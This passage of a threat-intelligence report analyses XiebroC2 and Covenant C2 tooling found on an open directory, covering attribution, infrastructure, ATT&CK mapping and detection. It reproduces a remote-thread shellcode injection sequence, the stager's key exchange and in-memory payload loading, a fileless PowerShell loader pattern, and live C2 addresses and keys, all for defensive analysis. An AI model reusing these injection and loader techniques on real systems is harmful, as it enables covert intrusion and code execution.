OpenProcess(/*mask=*/0x43a, 0, target_pid);          // minimal-rights open
VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProcess, allocAddr, shellcodeBytes, size);
VirtualProtectEx(hProcess, allocAddr, size, PAGE_EXECUTE_READ, &oldProt);  // RW→RX
CreateRemoteThreadEx(hProcess, NULL, 0, allocAddr, NULL, 0, NULL);         // execute
CloseHandle(hProcess);
```

All four injection APIs are resolved dynamically via `golang.org/x/sys/windows.LazyProc` — none appear in the binary's static PE import table. The access mask `0x43a` is a minimal-rights combination (`PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION`) rather than the over-privileged `PROCESS_ALL_ACCESS` (0x1FFFFF), reducing the profile visible to process-monitoring tools.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/open-directory-193-56-255-154-xiebroc2/runcrt-dispatch-command-handler.png" | relative_url }}" alt="Decompiled command handler showing RunCreateRemoteThread being dispatched from the MessagePack command switch alongside the MessagePack ForcePathObject call">
  <figcaption><em>Figure 9: The RunCreateRemoteThread dispatch in the command handler — the operator sends the Migration command via the encrypted C2 channel and the implant routes it to the shellcode injection function alongside the target PID.</em></figcaption>
</figure>

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/open-directory-193-56-255-154-xiebroc2/runcrt-full-injection-chain.png" | relative_url }}" alt="Decompiled code showing the full four-step shellcode injection chain: VirtualAllocEx, WriteProcessMemory, VirtualProtectEx (RW to RX), and CreateRemoteThreadEx, all called via golang LazyProc dynamic resolution">
  <figcaption><em>Figure 10: The complete four-step shellcode injection chain — allocate remote memory, write shellcode, change permissions from RW to RX (avoiding the detectable RWX state), then launch the thread. All four APIs are resolved dynamically at runtime to evade static import analysis.</em></figcaption>
</figure>

**Detection signature:** The four-API sequence `VirtualAllocEx` → `WriteProcessMemory` → `VirtualProtectEx (RW→RX)` → `CreateRemoteThreadEx` from `main.exe` targeting another process is a high-confidence behavioral detection signal.

## 4.10 SOCKS5 Reverse Proxy (Lateral Movement Enabler)

> **Analyst note:** This command turns the victim computer into a network relay. Once active, the attacker can reach other computers and services on the victim's internal network through the existing encrypted connection — effectively letting the operator browse internal systems as if physically on-site.

The `ReverseProxy` command invokes `Helper/proxy.ReverseSocksAgent`, which establishes a SOCKS5 reverse tunnel through the existing C2 connection. Once active, the operator can route arbitrary TCP traffic through the victim host into the internal network — effectively making the victim a network pivot point. Combined with credentials obtained via `inline-assembly` tooling, this capability enables lateral movement to internal resources without the operator needing direct network connectivity to internal subnets.

---

# 5. Technical Capabilities — Covenant C2 Stagers

> **Analyst note:** The two Covenant files on this staging server are lightweight connection tools. When executed, they reach out to the attacker's server, complete a security handshake, and then download and run a full-featured implant entirely in memory — nothing is saved to the hard drive. Two delivery methods were prepared (an executable file and a PowerShell command) so the attacker had options for how to deliver it to victims.

## 5.1 Covenant Framework Overview

Covenant (`github.com/cobbr/Covenant`) is an open-source .NET C2 framework created by Ryan Cobb, designed to demonstrate the .NET attack surface for red team operations. The official repository was archived in late 2021/early 2022, ending active development by the original author. However, the framework remains functional and continues to be used in both legitimate red team operations and malicious campaigns.

**Architectural components:**
- **Server:** Cross-platform ASP.NET Core application
- **Elite:** Multi-operator web management interface (the admin panel exposed on port 7443 in this investigation)
- **Grunt:** The full .NET implant deployed to victim systems
- **GruntStager:** The lightweight stager (what is on this staging server) that performs the key exchange and delivers the Grunt payload

## 5.2 Three-Phase Cryptographic Key Exchange

> **Analyst note:** Before the attacker's server sends the actual implant code to the victim, the two computers go through a three-step security handshake to verify they're talking to the right server. This makes the payload delivery hard to intercept and means even if someone captures the network traffic, they can't read the implant code without the right keys.

Static analysis of `GruntHTTP.exe` and the embedded payload in `GruntHTTP.ps1` using a .NET decompiler (dnSpy) revealed the following key exchange implementation. Covenant's key exchange provides forward secrecy — even if the pre-shared keys embedded in the stager are recovered (as they were in this analysis), past sessions cannot be decrypted because a unique session key is generated per connection:

```
Phase 0 — Registration (Message Type 0):
  Stager generates RSA-2048 keypair locally.
  Encrypts RSA public key with pre-shared AES-256 key (Build 1: VhsPbOCVryhYn0DbLsSMYJ00eynFRnREpzpFmuUAnuk=).
  POSTs to C2: i=[build_id]&data=[base64(AES_encrypt(RSA_pubkey))]&session=[token]
  Server responds: AES_encrypt(new_session_AES_key, RSA_public_key)

Phase 1 — Session Key Confirmation (Message Type 1):
  Stager decrypts new session key with RSA private key.
  Generates 4-byte random nonce.
  POSTs: AES_session_encrypt(nonce)
  Server responds: AES_session_encrypt([nonce || echo_nonce])

Phase 2 — Challenge Verification (Message Type 2):
  Stager verifies echoed nonce.
  POSTs: AES_session_encrypt(echo_nonce)
  Server responds: AES_session_encrypt(FULL GRUNT PAYLOAD)

Terminal — Fileless Payload Loading:
  Assembly.Load(AES_decrypt(payload)).GetTypes()[0].GetMethods()[0].Invoke(null, [url, cert, guid, aes])
  No disk write occurs at any point.
```

The three-round handshake provides mutual authentication: the server proves it decrypted the RSA public key (Phase 1), and the stager proves it decrypted the session key (Phase 2). The Grunt payload is only delivered after both sides are authenticated.

## 5.3 Dual Build Compartmentalization

Two separate Covenant stager builds were present on the staging server — a deliberate operational design:

<table class="professional-table">
  <thead>
    <tr>
      <th>Parameter</th>
      <th>Build 1 (GruntHTTP.exe)</th>
      <th>Build 2 (PS embedded payload)</th>
      <th>Relationship</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>C2 URL</td>
      <td><code>http://193.56.255.154:443</code></td>
      <td><code>http://193.56.255.154:443</code></td>
      <td class="confirmed">Same — shared listener</td>
    </tr>
    <tr>
      <td>POST <code>i=</code> parameter</td>
      <td><code>a19ea23062db990386a3a478cb89d52e</code></td>
      <td><code>a19ea23062db990386a3a478cb89d52e</code></td>
      <td class="confirmed">Same — listener-level constant</td>
    </tr>
    <tr>
      <td>POST <code>session=</code> token</td>
      <td><code>75db-99b1-25fe4e9afbe58696-320bea73</code></td>
      <td><code>75db-99b1-25fe4e9afbe58696-320bea73</code></td>
      <td class="confirmed">Same — highest-value detection string</td>
    </tr>
    <tr>
      <td>GUID prefix</td>
      <td><code>614b847dc4</code></td>
      <td><code>7c6e1e0ee6</code></td>
      <td class="possible">Different — build-level identity</td>
    </tr>
    <tr>
      <td>AES pre-shared key</td>
      <td><code>VhsPbOCVryhYn0DbLsSMYJ00eynFRnREpzpFmuUAnuk=</code></td>
      <td><code>b8SLEsbBJpi/eO6rVdtQpbkJPefqfqeTCE3mn96GHaM=</code></td>
      <td class="possible">Different — deliberate compartmentalization</td>
    </tr>
  </tbody>
</table>

**Intelligence interpretation:** The matching `session=` token and `i=` parameter confirm both stagers were generated against the same Covenant listener. The different GUID prefixes and AES pre-shared keys confirm they are separate stager instances. The design choice is deliberate: compromising one build's pre-shared key does not compromise the other build's session security.

**Detection consequence:** The shared `session=` token `75db-99b1-25fe4e9afbe58696-320bea73` appears in every HTTP POST from every host running either stager build. A single network detection rule targeting this string catches both delivery mechanisms simultaneously.

## 5.4 Default HTTP Profile — High-Value Fingerprinting

> **Analyst note:** The Covenant traffic from this investigation uses all the default settings that come with the Covenant framework out of the box. These default values have been publicly documented and are highly detectable on a network that inspects HTTP traffic content.

The operator did not customize Covenant's HTTP communication profile. All default fingerprints are present and detectable:

| Artifact | Value | Detection Surface |
|---|---|---|
| User-Agent | `Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36` | HTTP proxy, firewall |
| URL paths | `/en-us/index.html`, `/en-us/docs.html`, `/en-us/test.html` | Proxy, IDS |
| Cookie template | `ASPSESSIONID={10char}; SESSIONID=1552332971750` | Proxy, IDS |
| POST session token | `75db-99b1-25fe4e9afbe58696-320bea73` | Network sensor, proxy |
| Response wrapper | `// Hello World! {0}` — C2 data hidden in HTML comment | IDS response inspection |
| POST format | `i=[32hex]&data=[base64]&session=[token]` | DPI, proxy |
| Protocol anomaly | HTTP (cleartext) on port 443 | Protocol inspection |

**Notable anomaly:** The Chrome 41 User-Agent corresponds to a browser version released in 2015 that is no longer in circulation on modern networks. Any proxy or firewall alert on this exact User-Agent string will have a near-zero false positive rate in a modern enterprise environment.

**Port 443 anomaly:** The Covenant listener runs cleartext HTTP on port 443 (conventionally HTTPS/TLS). This bypasses controls that allow outbound port 443 without protocol inspection while avoiding TLS certificate overhead. Network sensors capable of protocol inspection will detect HTTP on port 443 as an immediate anomaly.

## 5.5 GruntHTTP.ps1 — PowerShell Fileless Delivery

> **Analyst note:** The PowerShell file is a one-line script that contains the entire second stager hidden inside it as compressed, encoded data. When run, it unpacks and executes the stager entirely in computer memory — nothing is saved to disk. This bypasses file-scanning antivirus because there is no file to scan.

The PowerShell loader uses three obfuscation layers that are decoded at runtime:

1. **Alias substitution:** Built-in PowerShell aliases (`sv` for `Set-Variable`, `gv` for `Get-Variable`) make the script harder to read at a glance
2. **Base64 encoding:** The embedded binary payload is Base64-encoded as a text blob inside the script
3. **Deflate compression:** The binary payload is compressed using raw RFC 1951 Deflate before Base64 encoding

**Decoded loader logic:**
```powershell
# Decode Base64 blob, decompress via Deflate stream
$bytes = New-Object IO.Compression.DeflateStream(
    [IO.MemoryStream][Convert]::FromBase64String('<BLOB>'),
    [IO.Compression.CompressionMode]::Decompress
)
# Load decompressed bytes as .NET assembly and invoke entry point
[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke(0, @(,[string[]]@())) | Out-Null
```

**PowerShell ScriptBlock logging (Event ID 4104)** will capture the decoded script content when PowerShell script block logging is enabled, providing a detection opportunity at the host level regardless of the obfuscation.

---

# 6. Threat Actor Assessment

> **Note on UTA identifiers:** "UTA" stands for Unattributed Threat Actor. UTA-2026-002 is an internal tracking designation assigned by The Hunters Ledger to actors observed across analysis who cannot yet be linked to a publicly named threat group. This label will not appear in external threat intelligence feeds or vendor reports — it is specific to this publication. If future evidence links this activity to a known named actor, the designation will be retired and updated accordingly.

## 6.1 Attribution Summary

```
Threat Actor:       Unknown (UTA-2026-002)
Named Actor:        INSUFFICIENT (<50% confidence) — no named actor attribution supportable
UTA Tracking:       MODERATE confidence (72%)
```

**Attribution to any named threat group — including APT28, APT41, or any Chinese-nexus actor — is not supportable with the available evidence.** Three independent lines of analysis converge on this conclusion:

1. **Infrastructure line:** Zero confirmed overlaps between `193.56.255.154` or `92.60.75.103` and any named threat actor's documented infrastructure. The XiebroC2 AES key cross-match with AhnLab ASEC-documented campaigns identifies only a shared framework default, not an operator-level link.

2. **TTP line:** All 25 observed MITRE ATT&CK techniques are either generic (used by dozens of different actor groups) or attributable to the frameworks themselves (XiebroC2, Covenant) rather than to any unique operator tradecraft.

3. **Source line:** No Tier 1 or Tier 2 source has attributed this infrastructure or these samples to any named actor. No government attribution (FBI, CISA, NSA, Five Eyes) exists for this IP.

## 6.2 UTA-2026-002 Distinguishing Characteristics

Despite insufficient evidence for named actor attribution, the available evidence supports characterizing a distinct, trackable operator. Three distinctive characteristics were identified (minimum 2 technical required):

**Characteristic 1 [TECHNICAL]:** GBK-to-UTF8 charset conversion hardcoded in **all** XiebroC2 shell command handlers. This is a runtime artifact of the operator's Windows system locale being configured for Chinese-language character sets (GBK = Windows code page 936, Simplified Chinese). This is not a framework default behavior in the XiebroC2 source code — it reflects the operator's own build environment.

**Characteristic 2 [TECHNICAL]:** Operator compile path `C:/Users/admin/Desktop/code/XiebroC2-3.1/` embedded in the XiebroC2 binary's pclntab symbol table, combined with the campaign tag `"vps"` hardcoded in the binary. These are direct artifacts of the operator's build process — including the operator's username (`admin`) and their deliberate choice of infrastructure label.

**Characteristic 3 [INFRASTRUCTURE]:** Shared OPSEC failure pattern across two VPS servers — `193.56.255.154` (AS9009/M247 Singapore) and `92.60.75.103` (AS49791/Newserverlife Kazakhstan) — in the same two-week window (March–April 2026). Both servers exhibit: Covenant admin panel publicly exposed on port 7443; open staging directory serving payloads; custom tool with embedded development artifacts (XiebroC2 compile path; Hermes DLL PDB path). The developer username `iamem` from the Hermes DLL PDB path (`C:\Users\iamem\source\repos\Hermes\x64\Release\Hermes.pdb`) is a candidate persistent operator identifier.

## 6.3 Why Named Actor Attribution is Rejected

**APT28 (Fancy Bear / Sednit / UAC-0001) — EXPLICITLY REJECTED:**
APT28's documented Covenant variant uses heavy customization including cloud-based C2 routing through file-sharing services (pCloud, Koofr, Icedrive, Filen), developed and refined across three years of operations [Source: The Hacker News citing ESET — https://thehackernews.com/2026/03/apt28-uses-beardshell-and-covenant.html; BleepingComputer — https://www.bleepingcomputer.com/news/security/apt28-hackers-deploy-customized-variant-of-covenant-open-source-tool/]. The stock default-profile Covenant in this campaign — Chrome 41 User-Agent from 2015, static session token, unmodified URL paths, no cloud routing — is fundamentally inconsistent with APT28's documented operational sophistication. No infrastructure overlap with APT28's documented Covenant infrastructure exists in available reporting.

**APT41 / Chinese-nexus named groups — INSUFFICIENT:**
GBK encoding and XiebroC2's Chinese-language origin are consistent with a Chinese-language operator environment, but named Chinese-nexus APT groups are characterized by custom tooling families (PlugX, ShadowPad, KEYPLUG, CROSSWALK) and sophisticated operational security — not default-configuration public frameworks with seven simultaneous OPSEC failures. XiebroC2 is publicly available to any Chinese-language offensive security practitioner.

## 6.4 Most Probable Hypothesis

**H2 (Generic crimeware operator with Chinese-language operator environment)** is the most consistent hypothesis:
- Default tooling configurations throughout suggest compilation from public source without customization
- Desktop/admin-username build environment consistent with an individual or very small team
- PoC DLL on the same VPS indicates active testing and tool development
- Seven simultaneous OPSEC failures are inconsistent with professional operational security discipline
- Custom Hermes DLL development (if the same-operator hypothesis for 92.60.75.103 is confirmed) suggests capability above purely commodity tool-reusing crimeware

**Infrastructure note on operator sophistication:** The exposure of SMB (port 445), RPC (port 135), WinRM (ports 5985 and 47001), NetBIOS (port 139), and the Covenant admin panel (port 7443) to the public internet is consistent with a default Windows Server 2025 installation that was not hardened after provisioning. Most operators at any sophistication level close these ports. This pattern strongly supports the assessment of an individual or small team with limited operational security maturity.

## 6.5 What Would Increase Attribution Confidence

- Passive DNS data linking infrastructure to a prior attributed campaign
- Identification of victims enabling targeting pattern analysis consistent with a specific actor
- The Hermes DLL C2 address resolving from placeholder `192.168.1.100` to a live server that is already attributed
- The `iamem` identifier linked to a tracked threat actor forum or development account
- Abuse complaint responses from M247 or Newserverlife surfacing provisioning data

---

# 7. Infrastructure Analysis

## 7.0 How the Infrastructure Was Mapped

> **Analyst note:** Starting from a single IP address, the investigation used the malware's own C2 framework fingerprint to search for related servers. This section explains the pivot chain — how four candidate IPs were identified, and why only one was elevated to likely same-operator status.

Analysis began with `193.56.255.154` identified from the malware's hardcoded configuration. The primary pivot indicator was the Covenant C2 admin panel fingerprint: a self-signed TLS certificate with `CN=Covenant` on port 7443, a default left in place by the operator. An infrastructure query (Hunt.io, queried 2026-04-02) searching for other IPs serving this fingerprint in the same timeframe returned four results:

| IP | ASN / Hosting | Covenant Port | Open Directory | Custom Tooling | Assessment |
|---|---|---|---|---|---|
| **193.56.255.154** | AS9009 / M247, Singapore | 443 + 7443 | Yes (Python SimpleHTTP, Windows) | XiebroC2 implant, Covenant stagers | **Primary — this investigation** |
| **92.60.75.103** | AS49791 / Newserverlife, Kazakhstan | 7443 | **Yes (Apache/Ubuntu)** | **Hermes DLL (novel, 0 VT detections)** | **MODERATE — probable same operator** |
| 68.183.21.171 | AS14061 / DigitalOcean, United States | 7443 | No | None observed | LOW — likely unrelated operator |
| 77.237.245.173 | AS51167 / Contabo, France/Germany | 7443 | No | None observed | LOW — likely unrelated operator |

`68.183.21.171` and `77.237.245.173` were assessed as unrelated: Covenant on port 7443 is a framework default and alone is not sufficient to cluster operators. Neither server had an open staging directory and neither served custom tooling — the two indicators that distinguish the primary operator's pattern.

`92.60.75.103` was elevated to MODERATE confidence because it matched the primary server's specific OPSEC failure profile: Covenant admin panel publicly exposed, an open staging directory serving a novel custom DLL (`s.d` / Hermes), and unstripped developer artifacts embedded in the tool (PDB path `C:\Users\iamem\source\repos\Hermes\x64\Release\Hermes.pdb`). This three-indicator combination occurring across two separate VPS servers within a two-week window exceeds reasonable coincidence. Confidence remains MODERATE rather than HIGH because no cryptographic or certificate-level confirmation links the two servers — different hosting providers, different operating systems (Windows vs. Ubuntu), and no malware payload observed calling back to both IPs.

A secondary pivot from the historical phishing activity on `193.56.255.154` identified the domain `desjardinsverif.com` (a 2023 Canadian financial sector impersonation domain) in passive DNS. This domain was noted for follow-on investigation but produced no indicators linking 2023 phishing activity to the 2026 C2 operator.

## 7.1 Primary C2 Server: 193.56.255.154

<table class="professional-table">
  <thead>
    <tr>
      <th>Attribute</th>
      <th>Value</th>
      <th>Source</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>IP Address</td>
      <td>193.56.255.154</td>
      <td>Direct analysis</td>
    </tr>
    <tr>
      <td>ASN</td>
      <td>AS9009 — M247 Europe SRL</td>
      <td>BGP.he.net + RIPE RDAP (Tier 1) — 3/3 sources agree</td>
    </tr>
    <tr>
      <td>Geolocation</td>
      <td>Singapore (26A Ayer Rajah Crescent)</td>
      <td>Hunt.io export + BGP.he.net</td>
    </tr>
    <tr>
      <td>Operating System</td>
      <td>Windows Server 2025 (build 10.0.26100)</td>
      <td>WinRM NTLM banner on port 5985 — DEFINITE</td>
    </tr>
    <tr>
      <td>Hostname</td>
      <td>WIN-RCH83RTDA5G</td>
      <td>WinRM NTLM NetBIOS field — auto-generated default; operator did not rename</td>
    </tr>
    <tr>
      <td>Hosting type</td>
      <td>Legitimate commercial VPS (permissive enforcement)</td>
      <td>M247 abuse contact: ro-legal@m247.ro; 48hr response commitment</td>
    </tr>
    <tr>
      <td>First seen malicious</td>
      <td>2023-04-14 (phishing) → 2026-03-28 (C2)</td>
      <td>VirusTotal community indicator + certificate date</td>
    </tr>
  </tbody>
</table>

**Port and service exposure:**

| Port | Service | Significance |
|---|---|---|
| 80/tcp | Python SimpleHTTP 0.6 — open directory | Staging server: all four samples hosted here |
| 135/tcp | Microsoft RPC | Exposes SAMR, Task Scheduler, SCM, Print Spooler (port 49671), Event Log |
| 139/tcp | NetBIOS Session Service | Windows file sharing stack exposed to internet |
| 443/tcp | Covenant C2 HTTP listener | Cleartext HTTP on HTTPS port — anomalous; `/en-us/docs.html` confirmed active |
| 445/tcp | SMB v2 | Authentication-protected but exposed to internet |
| 4444/tcp | XiebroC2 TCP C2 | Go implant C2; AES-128-ECB binary protocol |
| 4445/tcp | Possible XiebroC2 alt port | Observed open in scan data |
| 5985/tcp | WinRM | Leaks OS hostname and build without authentication |
| 7443/tcp | Covenant admin panel | HTTP 200 — publicly accessible; **critical OPSEC failure** |
| 47001/tcp | WinRM alt HTTP | WinRM doubly exposed |
| 49664–49672/tcp | Dynamic RPC | Print Spooler on 49671 (PrintNightmare attack surface) |

**Historical context:** The same IP hosted Canadian financial sector phishing (Desjardins + BMO impersonation domains) in 2023, confirmed by a Desjardins impersonation TLS certificate (SHA-1: `3a8c1f5edecf8c69df88d655d87dbc6d6decf258`) issued 2023-04-14. Whether the 2023 phishing operator and the 2026 C2 operator are the same entity remains unresolved. Passive DNS records show 27 total resolutions to this IP, including 13+ BMO and Desjardins phishing domains that expired through March 2026.

## 7.2 Secondary Server: 92.60.75.103 (MODERATE confidence — same operator)

A second server (AS49791 / Newserverlife LLC, Kazakhstan) shows an identical operational pattern within the same two-week window:

- Covenant C2 with admin panel publicly accessible on port 7443 (self-signed `CN=Covenant` certificate)
- Open staging directory (Apache/2.4.52 Ubuntu) serving the Hermes DLL
- Hermes DLL PDB path: `C:\Users\iamem\source\repos\Hermes\x64\Release\Hermes.pdb` — developer username `iamem`
- 0 VirusTotal detections at initial discovery; 12/72 at later scan date
- Active period: 2026-03-12 to 2026-03-16

The Hermes DLL is a novel, undocumented WinInet-based HTTP beacon in pre-alpha state. The C2 address is hardcoded as `192.168.1.100` (RFC 1918 placeholder) — it is not functional against a live server. A GitHub account at `github.com/Iamem` exists with 0 public repositories; this cannot be confirmed as the operator account without additional evidence.

**Confidence assessment for same-operator hypothesis:** MODERATE. Two servers with identical OPSEC failure profiles in the same two-week window exceeds reasonable coincidence. Confidence would upgrade to HIGH if the Hermes DLL C2 address resolves to `193.56.255.154` or a related IP in a production deployment.

## 7.3 M247/AS9009 Hosting Context

M247 Europe SRL is a legitimate commercial hosting and connectivity provider, not a purpose-built bulletproof hosting service. However, its scale, budget VPS pricing, and documented enforcement inconsistency make it attractive to threat actors. Published research documents prior malicious use of M247 infrastructure:

- Open directories containing Risepro stealer and generic trojans documented on M247 Dallas infrastructure [HYAS Threat Intel, May 2024: https://www.hyas.com/blog/hyas-threat-intel-report-may-202024]
- Published threat intelligence research (2022) identified M247 among the top hosting providers for BumbleBee and Cerberus malware families
- Active IOC documentation for AS9009 maintained by ThreatFox [https://threatfox.abuse.ch/asn/9009/] and Blocklist.de [https://www.blocklist.de/en/search.html?as=9009]

No prior open-source campaign attributions were found for `193.56.255.154` specifically — this IP appears newly deployed for this campaign.

## 7.4 Ecosystem Exposure — XiebroC2 and Covenant Threat Actor Adoption

**Confidence: INSUFFICIENT for named APT-level actor attribution; MODERATE for crimeware ecosystem characterization**

This subsection documents what is publicly known about the range of threat actors who have deployed XiebroC2 and Covenant, and whether the infrastructure in this investigation overlaps with any documented campaigns.

**XiebroC2 ecosystem:**
AhnLab ASEC documented XiebroC2 in credential brute-force campaigns targeting exposed MS-SQL servers in Q3–Q4 2025 [ASEC: https://asec.ahnlab.com/en/90369/; https://asec.ahnlab.com/en/90572/]. Those campaigns used the same default AES-128-ECB key (`QWERt_CSDMAHUATW`) documented in this report, confirming that framework default configurations are prevalent across XiebroC2 deployments — likely because the operator population using this tool is predominantly low-to-intermediate sophistication crimeware actors who do not customize framework defaults. No named APT-level group has been publicly attributed to XiebroC2 usage in any Tier 1 or Tier 2 source as of this publication. The framework's Chinese-language origin and GitHub availability mean it is accessible to any Chinese-language offensive security practitioner, making it a commodity tool within that ecosystem rather than a signature indicator for any specific actor.

**Covenant ecosystem:**
Covenant's documented threat actor users include: (1) **APT28** (documented, DIFFERENT heavily-modified variant using cloud-based C2 routing — explicitly inconsistent with this campaign's stock default profile, as detailed in Section 6.3); (2) various red team operators who use the archived framework for legitimate authorized testing; and (3) crimeware operators who deploy the framework without customization, relying on its default HTTP profile and pre-shared key infrastructure. No Tier 1 or Tier 2 source has attributed default-profile Covenant (matching the fingerprints in this investigation) to any named nation-state actor. The stock Chrome 41 User-Agent, unmodified URL paths, and static session token are consistent with an operator who compiled and deployed the framework without reviewing or modifying its default configuration — a profile that aligns with the crimeware hypothesis in Section 6.4.

**Infrastructure overlap assessment:** Zero confirmed overlaps between `193.56.255.154` or `92.60.75.103` and any published campaign attribution exist in available open-source intelligence. Both IPs are assessed as newly provisioned for this campaign based on passive DNS and certificate issuance dates.

---

# 8. MITRE ATT&CK Mapping

The following table shows HIGH confidence technique mappings drawn directly from binary analysis and behavioral observation. All techniques are HIGH confidence.

<table class="professional-table">
  <thead>
    <tr>
      <th>Tactic</th>
      <th>Technique ID</th>
      <th>Technique Name</th>
      <th>Confidence</th>
      <th>Evidence</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Execution</strong></td>
      <td>T1059.003</td>
      <td>Windows Command Shell</td>
      <td class="confirmed">HIGH</td>
      <td><code>shell</code>, <code>OSshell</code>, <code>shellWriteInput</code> commands invoke <code>cmd.exe</code></td>
    </tr>
    <tr>
      <td><strong>Execution</strong></td>
      <td>T1059.001</td>
      <td>PowerShell</td>
      <td class="confirmed">HIGH</td>
      <td><code>OSpowershell</code>, <code>RunPS</code> invoke PowerShell; PS one-liner delivery via GruntHTTP.ps1</td>
    </tr>
    <tr>
      <td><strong>Execution</strong></td>
      <td>T1106</td>
      <td>Native API</td>
      <td class="confirmed">HIGH</td>
      <td>All injection APIs resolved via LazyProc (no static IAT entries)</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1055.012</td>
      <td>Process Hollowing</td>
      <td class="confirmed">HIGH</td>
      <td>RunCreateProcessWithPipe: CREATE_SUSPENDED, PE parse, entry point patch, ResumeThread</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1055</td>
      <td>Process Injection</td>
      <td class="confirmed">HIGH</td>
      <td>RunCreateRemoteThread: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThreadEx — raw shellcode injection via new thread; no named sub-technique cleanly covers this variant</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1620</td>
      <td>Reflective Code Loading</td>
      <td class="confirmed">HIGH</td>
      <td>InlineAssembly (go-clr in-process CLR); Assembly.Load() in Covenant stagers; PS [Reflection.Assembly]::Load()</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1027</td>
      <td>Obfuscated Files or Information</td>
      <td class="confirmed">HIGH</td>
      <td>Covenant: Base64-encoded config, HTML comment data wrapper; PS: Base64+Deflate+alias obfuscation</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1140</td>
      <td>Deobfuscate/Decode Files</td>
      <td class="confirmed">HIGH</td>
      <td>PS loader: runtime Base64 decode + Deflate decompress before execution</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1036</td>
      <td>Masquerading</td>
      <td class="confirmed">HIGH</td>
      <td>Chrome 41 UA, ASP.NET cookies, Microsoft Docs URL paths masquerade Covenant traffic</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1070.004</td>
      <td>File Deletion</td>
      <td class="confirmed">HIGH</td>
      <td>ClientUnstaller: os.Remove(own_binary) + exit</td>
    </tr>
    <tr>
      <td><strong>Defense Evasion</strong></td>
      <td>T1571</td>
      <td>Non-Standard Port</td>
      <td class="confirmed">HIGH</td>
      <td>XiebroC2 TCP C2 on port 4444; Covenant HTTP (cleartext) on port 443</td>
    </tr>
    <tr>
      <td><strong>Collection</strong></td>
      <td>T1113</td>
      <td>Screen Capture</td>
      <td class="confirmed">HIGH</td>
      <td>Screenshot command: GDI-based screen capture, PNG sent to C2</td>
    </tr>
    <tr>
      <td><strong>Collection</strong></td>
      <td>T1560</td>
      <td>Archive Collected Data</td>
      <td class="confirmed">HIGH</td>
      <td>ZIP command: Helper/handle.Zip</td>
    </tr>
    <tr>
      <td><strong>Command and Control</strong></td>
      <td>T1071.001</td>
      <td>Application Layer Protocol: Web Protocols</td>
      <td class="confirmed">HIGH</td>
      <td>Covenant stagers: HTTP C2 to 193.56.255.154:443</td>
    </tr>
    <tr>
      <td><strong>Command and Control</strong></td>
      <td>T1573.001</td>
      <td>Encrypted Channel: Symmetric Cryptography</td>
      <td class="confirmed">HIGH</td>
      <td>XiebroC2: AES-128-ECB hardcoded key; Covenant: AES-256-CBC session encryption</td>
    </tr>
    <tr>
      <td><strong>Command and Control</strong></td>
      <td>T1573.002</td>
      <td>Encrypted Channel: Asymmetric Cryptography</td>
      <td class="confirmed">HIGH</td>
      <td>Covenant: RSA-2048 used in Phase 0 key exchange to encrypt session key delivery</td>
    </tr>
    <tr>
      <td><strong>Command and Control</strong></td>
      <td>T1572</td>
      <td>Protocol Tunneling</td>
      <td class="confirmed">HIGH</td>
      <td>ReverseProxy: ReverseSocksAgent SOCKS5 reverse tunnel</td>
    </tr>
    <tr>
      <td><strong>Command and Control</strong></td>
      <td>T1132</td>
      <td>Data Encoding</td>
      <td class="confirmed">HIGH</td>
      <td>MessagePack binary serialization for all XiebroC2 C2 traffic</td>
    </tr>
    <tr>
      <td><strong>Command and Control</strong></td>
      <td>T1105</td>
      <td>Ingress Tool Transfer</td>
      <td class="confirmed">HIGH</td>
      <td>UploadFile command: C2 operator → victim file drop</td>
    </tr>
    <tr>
      <td><strong>Discovery</strong></td>
      <td>T1082</td>
      <td>System Information Discovery</td>
      <td class="confirmed">HIGH</td>
      <td>SendInfo beacon: OS version, HWID, CLR version, admin status, OS category</td>
    </tr>
    <tr>
      <td><strong>Discovery</strong></td>
      <td>T1033</td>
      <td>System Owner/User Discovery</td>
      <td class="confirmed">HIGH</td>
      <td>SendInfo: USERNAME env var; NetWork command; s.d: GetComputerNameA</td>
    </tr>
    <tr>
      <td><strong>Discovery</strong></td>
      <td>T1016</td>
      <td>System Network Configuration Discovery</td>
      <td class="confirmed">HIGH</td>
      <td>SendInfo: GetInternalIP(); NetWork command: network interface enumeration</td>
    </tr>
    <tr>
      <td><strong>Discovery</strong></td>
      <td>T1057</td>
      <td>Process Discovery</td>
      <td class="confirmed">HIGH</td>
      <td>CheckAV: gopsutil process list; process command: full process list</td>
    </tr>
    <tr>
      <td><strong>Exfiltration</strong></td>
      <td>T1041</td>
      <td>Exfiltration Over C2 Channel</td>
      <td class="confirmed">HIGH</td>
      <td>downloadFile: reads arbitrary file, sends via TcpSend; Screenshot PNG exfiltration</td>
    </tr>
  </tbody>
</table>

*Table shows HIGH confidence mappings only, derived from direct binary analysis. T1055 (Process Injection) is mapped at the parent-technique level — the CreateRemoteThread shellcode injection variant (VirtualAllocEx + WriteProcessMemory + CreateRemoteThreadEx) does not fit a named sub-technique cleanly. No low-confidence techniques are included.*

---

# 9. Detection & Hunting

## 9.1 Detection Rule Files

Complete detection rules are available in the dedicated detection file:

**[hunting-detections/opendirectory-193-56-255-154-20260403-detections.md](/hunting-detections/opendirectory-193-56-255-154-20260403-detections.md)**

Detection coverage includes:
- **4 YARA rules:** XiebroC2 v3.1 static detection (AES key, typo strings, RunPE error strings); Covenant GruntStager static detection; PowerShell fileless loader detection
